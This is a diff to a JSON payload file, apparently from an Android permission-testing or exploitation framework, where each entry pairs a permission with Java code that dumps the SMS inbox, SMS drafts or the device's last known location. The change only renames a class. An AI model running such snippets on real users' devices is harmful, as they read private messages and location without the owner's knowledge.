@@ -35,7 +35,7 @@
   "vulnerabilities": ["android.permission.READ_SMS"],
   "name": "Read SMS received",
   "description": "Read SMS received",
-  "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/inbox\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS recived\";\n        }\n    }\n}",
+  "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/inbox\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS recived\";\n        }\n    }\n}",
   "resultType": "JSON",
   "__v": 0
 }, {
@@ -43,7 +43,7 @@
   "vulnerabilities": ["android.permission.READ_SMS"],
   "name": "Read SMS draft",
   "description": "Read SMS draft",
-  "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/draft\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS draft\";\n        }\n    }\n}",
+  "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/draft\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS draft\";\n        }\n    }\n}",
   "resultType": "JSON",
   "__v": 0
 }, {
@@ -59,7 +59,7 @@
   "vulnerabilities": ["android.permission.ACCESS_FINE_LOCATION"],
   "name": "Last last known location by network",
   "description": "Last last known location by network",
-  "content": "import android.content.Context;\nimport android.location.Location;\nimport android.location.LocationManager;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);\n        Location location = locationManager.getLastKnownLocation(\"network\");\n        return location.toString();\n    }\n}",
+  "content": "import android.content.Context;\nimport android.location.Location;\nimport android.location.LocationManager;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);\n        Location location = locationManager.getLastKnownLocation(\"network\");\n        return location.toString();\n    }\n}",
   "resultType": "string",
   "__v": 0
 }, {
